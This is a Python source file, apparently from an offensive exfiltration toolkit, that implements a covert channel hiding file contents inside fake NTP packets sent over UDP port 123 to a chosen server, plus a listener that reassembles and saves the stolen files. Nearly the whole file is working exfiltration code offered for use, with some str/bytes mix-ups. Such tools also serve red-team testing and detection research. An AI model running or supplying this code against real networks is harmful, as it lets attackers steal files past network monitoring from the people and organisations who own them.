#!/usr/bin/python

import os
import sys
import time
import zlib
import base64
import struct
import socket
from socket import AF_INET, SOCK_DGRAM

# Constants
READ_BINARY = "rb"
WRITE_BINARY = "wb"
NTP_UDP_PORT = 123
HOST = "pool.ntp.org"
#MAX_BYTES = 46
NULL = "\x00"
INIT_BYTE = "\x1b"
INIT_PACKET = "\x11\x22\x33\x44\x11\x12"
#TERM_PACKET = "\x21" * MAX_BYTES
DELIMITER = "\xff\xfb\x01"
PADDER = "\xee"

# NTP packet structure from: http://www.meinbergglobal.com/english/info/ntp-packet.htm

def exfiltrate(ntp_server, path_to_file, MAX_BYTES=46, time_delay=0.1):
    """
    Exfiltration over NTP. Too tired to document :)
    :param path_to_file: path to file to exfiltrate
    :param ntp_server: ntp server to exfiltrate to
    :param time_delay: time delay between packets. default 0.1
    :return:
    """
    def extract_real_time(buff):
        msg, address = client.recvfrom(buff)
        t = struct.unpack("!12I", msg)[10]
        t -= TIME1970
        print ("\tTime=%s" % time.ctime(t))

    # Read file
    try:
        fh = open(path_to_file, READ_BINARY)
        exfil_me = fh.read()
        fh.close()
    except:
        sys.stderr.write("Problem with reading file. ")
        return -1

    checksum = zlib.crc32(exfil_me)                 # Calculate CRC32 for later verification
    head, tail = os.path.split(path_to_file)        # Get filename

    exfil_me = base64.b64encode(exfil_me)           # After checksum Base64 encode

    address = (ntp_server, NTP_UDP_PORT)
    buf = 1024

    TIME1970 = 2208988800              # 1970-01-01 00:00:00

    if MAX_BYTES == None:
        MAX_BYTES = 46
    
    msg = '\x1b'                        # Initing a NTP packet
    msg += MAX_BYTES * "\x41"           # Payload goes here
    msg += NULL                         # Null terminator

    try:
        client = socket.socket(AF_INET, SOCK_DGRAM)
    except:
        sys.stderr.write("Don't have access to open raw UDP socket.")
        return -1

    # Initiation packet
    init_msg = INIT_BYTE                                        # Add init byte to first message
    init_msg += INIT_PACKET + DELIMITER                         # Add init string
    init_msg += tail + DELIMITER + str(checksum)                # Add file name and checksum
    init_msg += PADDER * (MAX_BYTES - (len(init_msg)-1))        # Padding the damn thing
    init_msg += NULL                                            # Add null termination
    client.sendto(init_msg.encode(), address)

    chunks = [exfil_me[i:i + MAX_BYTES] for i in range(0, len(exfil_me), MAX_BYTES)]  # Split into chunks
    # Send actual file
    for chunk in chunks:
        msg = INIT_BYTE.encode()
        msg += chunk + NULL.encode()
        client.sendto(msg, address)
        time.sleep(time_delay)

    # Send termination packet
    TERM_PACKET = "\x21" * MAX_BYTES
    msg = INIT_BYTE + TERM_PACKET + NULL
    client.sendto(msg.encode(), address)

    sys.stdout.write("Done with file %s " % tail)


def ntp_listener(ip="0.0.0.0", port=NTP_UDP_PORT, MAX_BYTES=46):
    """
    Start an NTP listener
    :param ip: default is "0.0.0.0"
    :param port: default is 123
    :return:
    """
    print(""" 
      _____      _________ _ _ _            
     |  __ \     |  ____(_) | (_)            
     | |__) |   _| |__   _| | |_ _ __   __ _ 
     |  ___/ | | |  __| | | | | | '_ \ / _` |
     | |   | |_| | |    | | | | | | | | (_| |
     |_|    \__, |_|    |_|_|_|_|_| |_|\__, |
             __/ |                      __/ |
            |___/                      |___/ """)
    if MAX_BYTES == None:
        MAX_BYTES = 46
    
    TERM_PACKET = "\x21" * MAX_BYTES
    
    # Try opening socket and listen
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except socket.error as msg:
        sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
        raise

    # Try binding to the socket
    try:
        s.bind((ip, port))
    except socket.error as msg:
        sys.stderr.write('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
        raise

    # Will keep connection alive as needed
    while 1:
        # Todo: DNS server is just a listener. We should allow the option of backwards communication.
        # Actually receiving data
        d = s.recvfrom(1024)
        data = d[0]
        addr = d[1]

        if data.find(INIT_PACKET.encode()) != -1:
            # Found initiation packet:

            # Extracting header from it
            data_start_offset = data.find((INIT_BYTE + INIT_PACKET + DELIMITER).encode()) + len((INIT_BYTE + INIT_PACKET + DELIMITER).encode())
            filename = data[data_start_offset:data_start_offset + data[data_start_offset:].find(DELIMITER.encode())].decode()
            crc32 = data[data.find(DELIMITER.encode())+len(DELIMITER):data.find(PADDER.encode())]

            sys.stdout.write("Initiation file transfer from " + str(addr) + " with file: " + str(filename) + "\n")
            actual_file = b""
            chunks_count = 0

        elif data.find(INIT_BYTE.encode()) != -1 and data.find(TERM_PACKET.encode()) == -1:
            # Found data packet:
            end_of_data_offset = data.find(NULL.encode())
            start_of_data_offset = data.find(INIT_BYTE.encode()) + len(INIT_BYTE)

            actual_file += data[start_of_data_offset:end_of_data_offset]
            chunks_count += 1

        elif data.find(TERM_PACKET.encode()):
            # Found termination packet:

            try:
                actual_file = base64.b64decode(actual_file)
            except:
                sys.stderr.write("File transfer error. Base64 decoding failed!")
                return -1

            # Will now compate CRC32s:

            if crc32[-10:].decode() == str(zlib.crc32(actual_file)):
                sys.stdout.write("CRC32 match! Now saving file")
                fh = open(crc32[-10:].decode() + filename, WRITE_BINARY)
                fh.write(actual_file)
                fh.close()
                replay = "Got it. Thanks :)"
                s.sendto(replay.encode(), addr)

            else:
                sys.stderr.write("CRC32 not match. Not saving file.")
                replay = "You fucked up!"
                s.sendto(replay.encode(), addr)

            filename = ""
            crc32 = b""
            i = 0
            addr = ""

        else:
            sys.stdout.write("Regular packet. Not listing it.")

    s.close()
    return 0
    pass


if __name__ == "__main__":
    ntp_listener("127.0.0.1")